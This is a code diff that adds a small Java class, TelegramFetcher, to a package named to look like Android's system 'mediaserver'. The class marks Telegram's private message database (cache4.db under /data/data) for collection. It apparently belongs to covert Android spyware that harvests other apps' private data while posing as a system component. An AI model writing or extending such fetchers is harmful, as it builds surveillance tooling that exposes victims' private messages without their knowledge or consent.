@@ -1,0 +1,15 @@
+package com.android.mediaserver.fetchers.apps;
+
+import com.android.mediaserver.fetchers.FetchedFile;
+import com.android.mediaserver.fetchers.file.FileFetcher;
+import java.io.File;
+import java.util.ArrayList;
+
+public class TelegramFetcher extends FileFetcher {
+  public TelegramFetcher() {
+    mFetchedFiles = new ArrayList();
+    mFetchedFiles.add(
+        new FetchedFile(new File("/data/data/org.telegram.messenger/files/cache4.db"), "APP",
+            "telegram"));
+  }
+}
